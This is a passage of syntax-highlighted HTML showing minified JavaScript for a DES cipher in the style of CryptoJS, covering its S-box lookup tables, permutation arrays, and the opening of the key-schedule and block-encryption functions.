class="number">67109124</span>,</span><br><span class="line">        <span class="number">13631488</span>: <span class="number">65536</span>,</span><br><span class="line">        <span class="number">14680064</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="number">15728640</span>: <span class="number">256</span>,</span><br><span class="line">        <span class="number">524288</span>: <span class="number">67174656</span>,</span><br><span class="line">        <span class="number">1572864</span>: <span class="number">67174404</span>,</span><br><span class="line">        <span class="number">2621440</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">3670016</span>: <span class="number">67109120</span>,</span><br><span class="line">        <span class="number">4718592</span>: <span class="number">67108868</span>,</span><br><span class="line">        <span class="number">5767168</span>: <span class="number">65536</span>,</span><br><span class="line">        <span class="number">6815744</span>: <span class="number">65540</span>,</span><br><span class="line">        <span class="number">7864320</span>: <span class="number">260</span>,</span><br><span class="line">        <span class="number">8912896</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="number">9961472</span>: <span class="number">256</span>,</span><br><span class="line">        <span class="number">11010048</span>: <span class="number">67174400</span>,</span><br><span class="line">        <span class="number">12058624</span>: <span class="number">65796</span>,</span><br><span class="line">        <span class="number">13107200</span>: <span class="number">65792</span>,</span><br><span class="line">        <span class="number">14155776</span>: <span class="number">67109124</span>,</span><br><span class="line">        <span class="number">15204352</span>: <span class="number">67174660</span>,</span><br><span class="line">        <span class="number">16252928</span>: <span class="number">67108864</span>,</span><br><span class="line">        <span class="number">16777216</span>: <span class="number">67174656</span>,</span><br><span class="line">        <span class="number">17825792</span>: <span class="number">65540</span>,</span><br><span class="line">        <span class="number">18874368</span>: <span class="number">65536</span>,</span><br><span class="line">        <span class="number">19922944</span>: <span class="number">67109120</span>,</span><br><span class="line">        <span class="number">20971520</span>: <span class="number">256</span>,</span><br><span class="line">        <span class="number">22020096</span>: <span class="number">67174660</span>,</span><br><span class="line">        <span class="number">23068672</span>: <span class="number">67108868</span>,</span><br><span class="line">        <span class="number">24117248</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">25165824</span>: <span class="number">67109124</span>,</span><br><span class="line">        <span class="number">26214400</span>: <span class="number">67108864</span>,</span><br><span class="line">        <span class="number">27262976</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="number">28311552</span>: <span class="number">65792</span>,</span><br><span class="line">        <span class="number">29360128</span>: <span class="number">67174400</span>,</span><br><span class="line">        <span class="number">30408704</span>: <span class="number">260</span>,</span><br><span class="line">        <span class="number">31457280</span>: <span class="number">65796</span>,</span><br><span class="line">        <span class="number">32505856</span>: <span class="number">67174404</span>,</span><br><span class="line">        <span class="number">17301504</span>: <span class="number">67108864</span>,</span><br><span class="line">        <span class="number">18350080</span>: <span class="number">260</span>,</span><br><span class="line">        <span class="number">19398656</span>: <span class="number">67174656</span>,</span><br><span class="line">        <span class="number">20447232</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">21495808</span>: <span class="number">65540</span>,</span><br><span class="line">        <span class="number">22544384</span>: <span class="number">67109120</span>,</span><br><span class="line">        <span class="number">23592960</span>: <span class="number">256</span>,</span><br><span class="line">        <span class="number">24641536</span>: <span class="number">67174404</span>,</span><br><span class="line">        <span class="number">25690112</span>: <span class="number">65536</span>,</span><br><span class="line">        <span class="number">26738688</span>: <span class="number">67174660</span>,</span><br><span class="line">        <span class="number">27787264</span>: <span class="number">65796</span>,</span><br><span class="line">        <span class="number">28835840</span>: <span class="number">67108868</span>,</span><br><span class="line">        <span class="number">29884416</span>: <span class="number">67109124</span>,</span><br><span class="line">        <span class="number">30932992</span>: <span class="number">67174400</span>,</span><br><span class="line">        <span class="number">31981568</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="number">33030144</span>: <span class="number">65792</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">2151682048</span>,</span><br><span class="line">        <span class="number">65536</span>: <span class="number">2147487808</span>,</span><br><span class="line">        <span class="number">131072</span>: <span class="number">4198464</span>,</span><br><span class="line">        <span class="number">196608</span>: <span class="number">2151677952</span>,</span><br><span class="line">        <span class="number">262144</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">327680</span>: <span class="number">4198400</span>,</span><br><span class="line">        <span class="number">393216</span>: <span class="number">2147483712</span>,</span><br><span class="line">        <span class="number">458752</span>: <span class="number">4194368</span>,</span><br><span class="line">        <span class="number">524288</span>: <span class="number">2147483648</span>,</span><br><span class="line">        <span class="number">589824</span>: <span class="number">4194304</span>,</span><br><span class="line">        <span class="number">655360</span>: <span class="number">64</span>,</span><br><span class="line">        <span class="number">720896</span>: <span class="number">2147487744</span>,</span><br><span class="line">        <span class="number">786432</span>: <span class="number">2151678016</span>,</span><br><span class="line">        <span class="number">851968</span>: <span class="number">4160</span>,</span><br><span class="line">        <span class="number">917504</span>: <span class="number">4096</span>,</span><br><span class="line">        <span class="number">983040</span>: <span class="number">2151682112</span>,</span><br><span class="line">        <span class="number">32768</span>: <span class="number">2147487808</span>,</span><br><span class="line">        <span class="number">98304</span>: <span class="number">64</span>,</span><br><span class="line">        <span class="number">163840</span>: <span class="number">2151678016</span>,</span><br><span class="line">        <span class="number">229376</span>: <span class="number">2147487744</span>,</span><br><span class="line">        <span class="number">294912</span>: <span class="number">4198400</span>,</span><br><span class="line">        <span class="number">360448</span>: <span class="number">2151682112</span>,</span><br><span class="line">        <span class="number">425984</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">491520</span>: <span class="number">2151677952</span>,</span><br><span class="line">        <span class="number">557056</span>: <span class="number">4096</span>,</span><br><span class="line">        <span class="number">622592</span>: <span class="number">2151682048</span>,</span><br><span class="line">        <span class="number">688128</span>: <span class="number">4194304</span>,</span><br><span class="line">        <span class="number">753664</span>: <span class="number">4160</span>,</span><br><span class="line">        <span class="number">819200</span>: <span class="number">2147483648</span>,</span><br><span class="line">        <span class="number">884736</span>: <span class="number">4194368</span>,</span><br><span class="line">        <span class="number">950272</span>: <span class="number">4198464</span>,</span><br><span class="line">        <span class="number">1015808</span>: <span class="number">2147483712</span>,</span><br><span class="line">        <span class="number">1048576</span>: <span class="number">4194368</span>,</span><br><span class="line">        <span class="number">1114112</span>: <span class="number">4198400</span>,</span><br><span class="line">        <span class="number">1179648</span>: <span class="number">2147483712</span>,</span><br><span class="line">        <span class="number">1245184</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">1310720</span>: <span class="number">4160</span>,</span><br><span class="line">        <span class="number">1376256</span>: <span class="number">2151678016</span>,</span><br><span class="line">        <span class="number">1441792</span>: <span class="number">2151682048</span>,</span><br><span class="line">        <span class="number">1507328</span>: <span class="number">2147487808</span>,</span><br><span class="line">        <span class="number">1572864</span>: <span class="number">2151682112</span>,</span><br><span class="line">        <span class="number">1638400</span>: <span class="number">2147483648</span>,</span><br><span class="line">        <span class="number">1703936</span>: <span class="number">2151677952</span>,</span><br><span class="line">        <span class="number">1769472</span>: <span class="number">4198464</span>,</span><br><span class="line">        <span class="number">1835008</span>: <span class="number">2147487744</span>,</span><br><span class="line">        <span class="number">1900544</span>: <span class="number">4194304</span>,</span><br><span class="line">        <span class="number">1966080</span>: <span class="number">64</span>,</span><br><span class="line">        <span class="number">2031616</span>: <span class="number">4096</span>,</span><br><span class="line">        <span class="number">1081344</span>: <span class="number">2151677952</span>,</span><br><span class="line">        <span class="number">1146880</span>: <span class="number">2151682112</span>,</span><br><span class="line">        <span class="number">1212416</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">1277952</span>: <span class="number">4198400</span>,</span><br><span class="line">        <span class="number">1343488</span>: <span class="number">4194368</span>,</span><br><span class="line">        <span class="number">1409024</span>: <span class="number">2147483648</span>,</span><br><span class="line">        <span class="number">1474560</span>: <span class="number">2147487808</span>,</span><br><span class="line">        <span class="number">1540096</span>: <span class="number">64</span>,</span><br><span class="line">        <span class="number">1605632</span>: <span class="number">2147483712</span>,</span><br><span class="line">        <span class="number">1671168</span>: <span class="number">4096</span>,</span><br><span class="line">        <span class="number">1736704</span>: <span class="number">2147487744</span>,</span><br><span class="line">        <span class="number">1802240</span>: <span class="number">2151678016</span>,</span><br><span class="line">        <span class="number">1867776</span>: <span class="number">4160</span>,</span><br><span class="line">        <span class="number">1933312</span>: <span class="number">2151682048</span>,</span><br><span class="line">        <span class="number">1998848</span>: <span class="number">4194304</span>,</span><br><span class="line">        <span class="number">2064384</span>: <span class="number">4198464</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">128</span>,</span><br><span class="line">        <span class="number">4096</span>: <span class="number">17039360</span>,</span><br><span class="line">        <span class="number">8192</span>: <span class="number">262144</span>,</span><br><span class="line">        <span class="number">12288</span>: <span class="number">536870912</span>,</span><br><span class="line">        <span class="number">16384</span>: <span class="number">537133184</span>,</span><br><span class="line">        <span class="number">20480</span>: <span class="number">16777344</span>,</span><br><span class="line">        <span class="number">24576</span>: <span class="number">553648256</span>,</span><br><span class="line">        <span class="number">28672</span>: <span class="number">262272</span>,</span><br><span class="line">        <span class="number">32768</span>: <span class="number">16777216</span>,</span><br><span class="line">        <span class="number">36864</span>: <span class="number">537133056</span>,</span><br><span class="line">        <span class="number">40960</span>: <span class="number">536871040</span>,</span><br><span class="line">        <span class="number">45056</span>: <span class="number">553910400</span>,</span><br><span class="line">        <span class="number">49152</span>: <span class="number">553910272</span>,</span><br><span class="line">        <span class="number">53248</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">57344</span>: <span class="number">17039488</span>,</span><br><span class="line">        <span class="number">61440</span>: <span class="number">553648128</span>,</span><br><span class="line">        <span class="number">2048</span>: <span class="number">17039488</span>,</span><br><span class="line">        <span class="number">6144</span>: <span class="number">553648256</span>,</span><br><span class="line">        <span class="number">10240</span>: <span class="number">128</span>,</span><br><span class="line">        <span class="number">14336</span>: <span class="number">17039360</span>,</span><br><span class="line">        <span class="number">18432</span>: <span class="number">262144</span>,</span><br><span class="line">        <span class="number">22528</span>: <span class="number">537133184</span>,</span><br><span class="line">        <span class="number">26624</span>: <span class="number">553910272</span>,</span><br><span class="line">        <span class="number">30720</span>: <span class="number">536870912</span>,</span><br><span class="line">        <span class="number">34816</span>: <span class="number">537133056</span>,</span><br><span class="line">        <span class="number">38912</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">43008</span>: <span class="number">553910400</span>,</span><br><span class="line">        <span class="number">47104</span>: <span class="number">16777344</span>,</span><br><span class="line">        <span class="number">51200</span>: <span class="number">536871040</span>,</span><br><span class="line">        <span class="number">55296</span>: <span class="number">553648128</span>,</span><br><span class="line">        <span class="number">59392</span>: <span class="number">16777216</span>,</span><br><span class="line">        <span class="number">63488</span>: <span class="number">262272</span>,</span><br><span class="line">        <span class="number">65536</span>: <span class="number">262144</span>,</span><br><span class="line">        <span class="number">69632</span>: <span class="number">128</span>,</span><br><span class="line">        <span class="number">73728</span>: <span class="number">536870912</span>,</span><br><span class="line">        <span class="number">77824</span>: <span class="number">553648256</span>,</span><br><span class="line">        <span class="number">81920</span>: <span class="number">16777344</span>,</span><br><span class="line">        <span class="number">86016</span>: <span class="number">553910272</span>,</span><br><span class="line">        <span class="number">90112</span>: <span class="number">537133184</span>,</span><br><span class="line">        <span class="number">94208</span>: <span class="number">16777216</span>,</span><br><span class="line">        <span class="number">98304</span>: <span class="number">553910400</span>,</span><br><span class="line">        <span class="number">102400</span>: <span class="number">553648128</span>,</span><br><span class="line">        <span class="number">106496</span>: <span class="number">17039360</span>,</span><br><span class="line">        <span class="number">110592</span>: <span class="number">537133056</span>,</span><br><span class="line">        <span class="number">114688</span>: <span class="number">262272</span>,</span><br><span class="line">        <span class="number">118784</span>: <span class="number">536871040</span>,</span><br><span class="line">        <span class="number">122880</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">126976</span>: <span class="number">17039488</span>,</span><br><span class="line">        <span class="number">67584</span>: <span class="number">553648256</span>,</span><br><span class="line">        <span class="number">71680</span>: <span class="number">16777216</span>,</span><br><span class="line">        <span class="number">75776</span>: <span class="number">17039360</span>,</span><br><span class="line">        <span class="number">79872</span>: <span class="number">537133184</span>,</span><br><span class="line">        <span class="number">83968</span>: <span class="number">536870912</span>,</span><br><span class="line">        <span class="number">88064</span>: <span class="number">17039488</span>,</span><br><span class="line">        <span class="number">92160</span>: <span class="number">128</span>,</span><br><span class="line">        <span class="number">96256</span>: <span class="number">553910272</span>,</span><br><span class="line">        <span class="number">100352</span>: <span class="number">262272</span>,</span><br><span class="line">        <span class="number">104448</span>: <span class="number">553910400</span>,</span><br><span class="line">        <span class="number">108544</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">112640</span>: <span class="number">553648128</span>,</span><br><span class="line">        <span class="number">116736</span>: <span class="number">16777344</span>,</span><br><span class="line">        <span class="number">120832</span>: <span class="number">262144</span>,</span><br><span class="line">        <span class="number">124928</span>: <span class="number">537133056</span>,</span><br><span class="line">        <span class="number">129024</span>: <span class="number">536871040</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">268435464</span>,</span><br><span class="line">        <span class="number">256</span>: <span class="number">8192</span>,</span><br><span class="line">        <span class="number">512</span>: <span class="number">270532608</span>,</span><br><span class="line">        <span class="number">768</span>: <span class="number">270540808</span>,</span><br><span class="line">        <span class="number">1024</span>: <span class="number">268443648</span>,</span><br><span class="line">        <span class="number">1280</span>: <span class="number">2097152</span>,</span><br><span class="line">        <span class="number">1536</span>: <span class="number">2097160</span>,</span><br><span class="line">        <span class="number">1792</span>: <span class="number">268435456</span>,</span><br><span class="line">        <span class="number">2048</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">2304</span>: <span class="number">268443656</span>,</span><br><span class="line">        <span class="number">2560</span>: <span class="number">2105344</span>,</span><br><span class="line">        <span class="number">2816</span>: <span class="number">8</span>,</span><br><span class="line">        <span class="number">3072</span>: <span class="number">270532616</span>,</span><br><span class="line">        <span class="number">3328</span>: <span class="number">2105352</span>,</span><br><span class="line">        <span class="number">3584</span>: <span class="number">8200</span>,</span><br><span class="line">        <span class="number">3840</span>: <span class="number">270540800</span>,</span><br><span class="line">        <span class="number">128</span>: <span class="number">270532608</span>,</span><br><span class="line">        <span class="number">384</span>: <span class="number">270540808</span>,</span><br><span class="line">        <span class="number">640</span>: <span class="number">8</span>,</span><br><span class="line">        <span class="number">896</span>: <span class="number">2097152</span>,</span><br><span class="line">        <span class="number">1152</span>: <span class="number">2105352</span>,</span><br><span class="line">        <span class="number">1408</span>: <span class="number">268435464</span>,</span><br><span class="line">        <span class="number">1664</span>: <span class="number">268443648</span>,</span><br><span class="line">        <span class="number">1920</span>: <span class="number">8200</span>,</span><br><span class="line">        <span class="number">2176</span>: <span class="number">2097160</span>,</span><br><span class="line">        <span class="number">2432</span>: <span class="number">8192</span>,</span><br><span class="line">        <span class="number">2688</span>: <span class="number">268443656</span>,</span><br><span class="line">        <span class="number">2944</span>: <span class="number">270532616</span>,</span><br><span class="line">        <span class="number">3200</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">3456</span>: <span class="number">270540800</span>,</span><br><span class="line">        <span class="number">3712</span>: <span class="number">2105344</span>,</span><br><span class="line">        <span class="number">3968</span>: <span class="number">268435456</span>,</span><br><span class="line">        <span class="number">4096</span>: <span class="number">268443648</span>,</span><br><span class="line">        <span class="number">4352</span>: <span class="number">270532616</span>,</span><br><span class="line">        <span class="number">4608</span>: <span class="number">270540808</span>,</span><br><span class="line">        <span class="number">4864</span>: <span class="number">8200</span>,</span><br><span class="line">        <span class="number">5120</span>: <span class="number">2097152</span>,</span><br><span class="line">        <span class="number">5376</span>: <span class="number">268435456</span>,</span><br><span class="line">        <span class="number">5632</span>: <span class="number">268435464</span>,</span><br><span class="line">        <span class="number">5888</span>: <span class="number">2105344</span>,</span><br><span class="line">        <span class="number">6144</span>: <span class="number">2105352</span>,</span><br><span class="line">        <span class="number">6400</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">6656</span>: <span class="number">8</span>,</span><br><span class="line">        <span class="number">6912</span>: <span class="number">270532608</span>,</span><br><span class="line">        <span class="number">7168</span>: <span class="number">8192</span>,</span><br><span class="line">        <span class="number">7424</span>: <span class="number">268443656</span>,</span><br><span class="line">        <span class="number">7680</span>: <span class="number">270540800</span>,</span><br><span class="line">        <span class="number">7936</span>: <span class="number">2097160</span>,</span><br><span class="line">        <span class="number">4224</span>: <span class="number">8</span>,</span><br><span class="line">        <span class="number">4480</span>: <span class="number">2105344</span>,</span><br><span class="line">        <span class="number">4736</span>: <span class="number">2097152</span>,</span><br><span class="line">        <span class="number">4992</span>: <span class="number">268435464</span>,</span><br><span class="line">        <span class="number">5248</span>: <span class="number">268443648</span>,</span><br><span class="line">        <span class="number">5504</span>: <span class="number">8200</span>,</span><br><span class="line">        <span class="number">5760</span>: <span class="number">270540808</span>,</span><br><span class="line">        <span class="number">6016</span>: <span class="number">270532608</span>,</span><br><span class="line">        <span class="number">6272</span>: <span class="number">270540800</span>,</span><br><span class="line">        <span class="number">6528</span>: <span class="number">270532616</span>,</span><br><span class="line">        <span class="number">6784</span>: <span class="number">8192</span>,</span><br><span class="line">        <span class="number">7040</span>: <span class="number">2105352</span>,</span><br><span class="line">        <span class="number">7296</span>: <span class="number">2097160</span>,</span><br><span class="line">        <span class="number">7552</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">7808</span>: <span class="number">268435456</span>,</span><br><span class="line">        <span class="number">8064</span>: <span class="number">268443656</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">1048576</span>,</span><br><span class="line">        <span class="number">16</span>: <span class="number">33555457</span>,</span><br><span class="line">        <span class="number">32</span>: <span class="number">1024</span>,</span><br><span class="line">        <span class="number">48</span>: <span class="number">1049601</span>,</span><br><span class="line">        <span class="number">64</span>: <span class="number">34604033</span>,</span><br><span class="line">        <span class="number">80</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">96</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="number">112</span>: <span class="number">34603009</span>,</span><br><span class="line">        <span class="number">128</span>: <span class="number">33555456</span>,</span><br><span class="line">        <span class="number">144</span>: <span class="number">1048577</span>,</span><br><span class="line">        <span class="number">160</span>: <span class="number">33554433</span>,</span><br><span class="line">        <span class="number">176</span>: <span class="number">34604032</span>,</span><br><span class="line">        <span class="number">192</span>: <span class="number">34603008</span>,</span><br><span class="line">        <span class="number">208</span>: <span class="number">1025</span>,</span><br><span class="line">        <span class="number">224</span>: <span class="number">1049600</span>,</span><br><span class="line">        <span class="number">240</span>: <span class="number">33554432</span>,</span><br><span class="line">        <span class="number">8</span>: <span class="number">34603009</span>,</span><br><span class="line">        <span class="number">24</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">40</span>: <span class="number">33555457</span>,</span><br><span class="line">        <span class="number">56</span>: <span class="number">34604032</span>,</span><br><span class="line">        <span class="number">72</span>: <span class="number">1048576</span>,</span><br><span class="line">        <span class="number">88</span>: <span class="number">33554433</span>,</span><br><span class="line">        <span class="number">104</span>: <span class="number">33554432</span>,</span><br><span class="line">        <span class="number">120</span>: <span class="number">1025</span>,</span><br><span class="line">        <span class="number">136</span>: <span class="number">1049601</span>,</span><br><span class="line">        <span class="number">152</span>: <span class="number">33555456</span>,</span><br><span class="line">        <span class="number">168</span>: <span class="number">34603008</span>,</span><br><span class="line">        <span class="number">184</span>: <span class="number">1048577</span>,</span><br><span class="line">        <span class="number">200</span>: <span class="number">1024</span>,</span><br><span class="line">        <span class="number">216</span>: <span class="number">34604033</span>,</span><br><span class="line">        <span class="number">232</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="number">248</span>: <span class="number">1049600</span>,</span><br><span class="line">        <span class="number">256</span>: <span class="number">33554432</span>,</span><br><span class="line">        <span class="number">272</span>: <span class="number">1048576</span>,</span><br><span class="line">        <span class="number">288</span>: <span class="number">33555457</span>,</span><br><span class="line">        <span class="number">304</span>: <span class="number">34603009</span>,</span><br><span class="line">        <span class="number">320</span>: <span class="number">1048577</span>,</span><br><span class="line">        <span class="number">336</span>: <span class="number">33555456</span>,</span><br><span class="line">        <span class="number">352</span>: <span class="number">34604032</span>,</span><br><span class="line">        <span class="number">368</span>: <span class="number">1049601</span>,</span><br><span class="line">        <span class="number">384</span>: <span class="number">1025</span>,</span><br><span class="line">        <span class="number">400</span>: <span class="number">34604033</span>,</span><br><span class="line">        <span class="number">416</span>: <span class="number">1049600</span>,</span><br><span class="line">        <span class="number">432</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="number">448</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">464</span>: <span class="number">34603008</span>,</span><br><span class="line">        <span class="number">480</span>: <span class="number">33554433</span>,</span><br><span class="line">        <span class="number">496</span>: <span class="number">1024</span>,</span><br><span class="line">        <span class="number">264</span>: <span class="number">1049600</span>,</span><br><span class="line">        <span class="number">280</span>: <span class="number">33555457</span>,</span><br><span class="line">        <span class="number">296</span>: <span class="number">34603009</span>,</span><br><span class="line">        <span class="number">312</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="number">328</span>: <span class="number">33554432</span>,</span><br><span class="line">        <span class="number">344</span>: <span class="number">1048576</span>,</span><br><span class="line">        <span class="number">360</span>: <span class="number">1025</span>,</span><br><span class="line">        <span class="number">376</span>: <span class="number">34604032</span>,</span><br><span class="line">        <span class="number">392</span>: <span class="number">33554433</span>,</span><br><span class="line">        <span class="number">408</span>: <span class="number">34603008</span>,</span><br><span class="line">        <span class="number">424</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">440</span>: <span class="number">34604033</span>,</span><br><span class="line">        <span class="number">456</span>: <span class="number">1049601</span>,</span><br><span class="line">        <span class="number">472</span>: <span class="number">1024</span>,</span><br><span class="line">        <span class="number">488</span>: <span class="number">33555456</span>,</span><br><span class="line">        <span class="number">504</span>: <span class="number">1048577</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">134219808</span>,</span><br><span class="line">        <span class="number">1</span>: <span class="number">131072</span>,</span><br><span class="line">        <span class="number">2</span>: <span class="number">134217728</span>,</span><br><span class="line">        <span class="number">3</span>: <span class="number">32</span>,</span><br><span class="line">        <span class="number">4</span>: <span class="number">131104</span>,</span><br><span class="line">        <span class="number">5</span>: <span class="number">134350880</span>,</span><br><span class="line">        <span class="number">6</span>: <span class="number">134350848</span>,</span><br><span class="line">        <span class="number">7</span>: <span class="number">2048</span>,</span><br><span class="line">        <span class="number">8</span>: <span class="number">134348800</span>,</span><br><span class="line">        <span class="number">9</span>: <span class="number">134219776</span>,</span><br><span class="line">        <span class="number">10</span>: <span class="number">133120</span>,</span><br><span class="line">        <span class="number">11</span>: <span class="number">134348832</span>,</span><br><span class="line">        <span class="number">12</span>: <span class="number">2080</span>,</span><br><span class="line">        <span class="number">13</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">14</span>: <span class="number">134217760</span>,</span><br><span class="line">        <span class="number">15</span>: <span class="number">133152</span>,</span><br><span class="line">        <span class="number">2147483648</span>: <span class="number">2048</span>,</span><br><span class="line">        <span class="number">2147483649</span>: <span class="number">134350880</span>,</span><br><span class="line">        <span class="number">2147483650</span>: <span class="number">134219808</span>,</span><br><span class="line">        <span class="number">2147483651</span>: <span class="number">134217728</span>,</span><br><span class="line">        <span class="number">2147483652</span>: <span class="number">134348800</span>,</span><br><span class="line">        <span class="number">2147483653</span>: <span class="number">133120</span>,</span><br><span class="line">        <span class="number">2147483654</span>: <span class="number">133152</span>,</span><br><span class="line">        <span class="number">2147483655</span>: <span class="number">32</span>,</span><br><span class="line">        <span class="number">2147483656</span>: <span class="number">134217760</span>,</span><br><span class="line">        <span class="number">2147483657</span>: <span class="number">2080</span>,</span><br><span class="line">        <span class="number">2147483658</span>: <span class="number">131104</span>,</span><br><span class="line">        <span class="number">2147483659</span>: <span class="number">134350848</span>,</span><br><span class="line">        <span class="number">2147483660</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">2147483661</span>: <span class="number">134348832</span>,</span><br><span class="line">        <span class="number">2147483662</span>: <span class="number">134219776</span>,</span><br><span class="line">        <span class="number">2147483663</span>: <span class="number">131072</span>,</span><br><span class="line">        <span class="number">16</span>: <span class="number">133152</span>,</span><br><span class="line">        <span class="number">17</span>: <span class="number">134350848</span>,</span><br><span class="line">        <span class="number">18</span>: <span class="number">32</span>,</span><br><span class="line">        <span class="number">19</span>: <span class="number">2048</span>,</span><br><span class="line">        <span class="number">20</span>: <span class="number">134219776</span>,</span><br><span class="line">        <span class="number">21</span>: <span class="number">134217760</span>,</span><br><span class="line">        <span class="number">22</span>: <span class="number">134348832</span>,</span><br><span class="line">        <span class="number">23</span>: <span class="number">131072</span>,</span><br><span class="line">        <span class="number">24</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">25</span>: <span class="number">131104</span>,</span><br><span class="line">        <span class="number">26</span>: <span class="number">134348800</span>,</span><br><span class="line">        <span class="number">27</span>: <span class="number">134219808</span>,</span><br><span class="line">        <span class="number">28</span>: <span class="number">134350880</span>,</span><br><span class="line">        <span class="number">29</span>: <span class="number">133120</span>,</span><br><span class="line">        <span class="number">30</span>: <span class="number">2080</span>,</span><br><span class="line">        <span class="number">31</span>: <span class="number">134217728</span>,</span><br><span class="line">        <span class="number">2147483664</span>: <span class="number">131072</span>,</span><br><span class="line">        <span class="number">2147483665</span>: <span class="number">2048</span>,</span><br><span class="line">        <span class="number">2147483666</span>: <span class="number">134348832</span>,</span><br><span class="line">        <span class="number">2147483667</span>: <span class="number">133152</span>,</span><br><span class="line">        <span class="number">2147483668</span>: <span class="number">32</span>,</span><br><span class="line">        <span class="number">2147483669</span>: <span class="number">134348800</span>,</span><br><span class="line">        <span class="number">2147483670</span>: <span class="number">134217728</span>,</span><br><span class="line">        <span class="number">2147483671</span>: <span class="number">134219808</span>,</span><br><span class="line">        <span class="number">2147483672</span>: <span class="number">134350880</span>,</span><br><span class="line">        <span class="number">2147483673</span>: <span class="number">134217760</span>,</span><br><span class="line">        <span class="number">2147483674</span>: <span class="number">134219776</span>,</span><br><span class="line">        <span class="number">2147483675</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">2147483676</span>: <span class="number">133120</span>,</span><br><span class="line">        <span class="number">2147483677</span>: <span class="number">2080</span>,</span><br><span class="line">        <span class="number">2147483678</span>: <span class="number">131104</span>,</span><br><span class="line">        <span class="number">2147483679</span>: <span class="number">134350848</span></span><br><span class="line">    &#125;]</span><br><span class="line">      , h = [<span class="number">483991120</span>, <span class="number">1058535</span>, <span class="number">512567407</span>, <span class="number">10651221</span>, <span class="number">217723</span>]</span><br><span class="line">      , u = [<span class="number">4160749569</span>, <span class="number">528482304</span>, <span class="number">33030144</span>, <span class="number">2064384</span>, <span class="number">129024</span>, <span class="number">8064</span>, <span class="number">504</span>, <span class="number">2147483679</span>]</span><br><span class="line">      , p = o.<span class="property">DES</span> = n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">_doReset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">_key</span>.<span class="property">words</span>, t = [], r = <span class="number">0</span>; <span class="number">56</span> &gt; r; r++) &#123;</span><br><span class="line">                <span class="keyword">var</span> n = a[r] - <span class="number">1</span>;</span><br><span class="line">                t[r] = e[n &gt;&gt;&gt; <span class="number">5</span>] &gt;&gt;&gt; <span class="number">31</span> - n % <span class="number">32</span> &amp; <span class="number">1</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (e = <span class="variable language_">this</span>.<span class="property">_subKeys</span> = [],</span><br><span class="line">            n = <span class="number">0</span>; <span class="number">16</span> &gt; n; n++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = e[n] = [], o = c[n], r = <span class="number">0</span>; <span class="number">24</span> &gt; r; r++)</span><br><span class="line">                    i[r / <span class="number">6</span> | <span class="number">0</span>] |= t[(s[r] - <span class="number">1</span> + o) % <span class="number">28</span>] &lt;&lt; <span class="number">31</span> - r % <span class="number">6</span>,</span><br><span class="line">                    i[<span class="number">4</span> + (r / <span class="number">6</span> | <span class="number">0</span>)] |= t[<span class="number">28</span> + (s[r + <span class="number">24</span>] - <span class="number">1</span> + o) % <span class="number">28</span>] &lt;&lt; <span class="number">31</span> - r % <span class="number">6</span>;</span><br><span class="line">                <span class="keyword">for</span> (i[<span class="number">0</span>] = i[<span class="number">0</span>] &lt;&lt; <span class="number">1</span> | i[<span class="number">0</span>] &gt;&gt;&gt; <span class="number">31</span>,</span><br><span class="line">                r = <span class="number">1</span>; <span class="number">7</span> &gt; r; r++)</span><br><span class="line">                    i[r] &gt;&gt;&gt;= <span class="number">4</span> * (r - <span class="number">1</span>) + <span class="number">3</span>;</span><br><span class="line">                i[<span class="number">7</span>] = i[<span class="number">7</span>] &lt;&lt; <span class="number">5</span> | i[<span class="number">7</span>] &gt;&gt;&gt; <span class="number">27</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (t = <span class="variable language_">this</span>.<span class="property">_invSubKeys</span> = [],</span><br><span class="line">            r = <span class="number">0</span>; <span class="number">16</span> &gt; r; r++)</span><br><span class="line">                t[r] = e[<span class="number">15</span> - r]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">encryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doCryptBlock</span>(e, t, <span class="variable language_">this</span>.<span class="property">_subKeys</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span 